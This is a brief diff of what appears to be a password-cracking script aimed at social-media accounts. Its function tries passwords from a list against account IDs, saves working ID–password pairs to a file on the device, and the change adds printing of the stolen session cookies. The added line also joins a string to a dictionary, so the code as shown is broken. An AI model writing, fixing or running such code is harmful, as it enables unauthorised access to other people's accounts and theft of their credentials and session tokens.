@@ -353,7 +353,7 @@ def ffb(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[0;92m[MUZZI-OK] %s | %s'%(ids,pas))
-				
+				print('\033[1;32m [COOKIES] '+coki)		
 				open('/sdcard/MUZZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
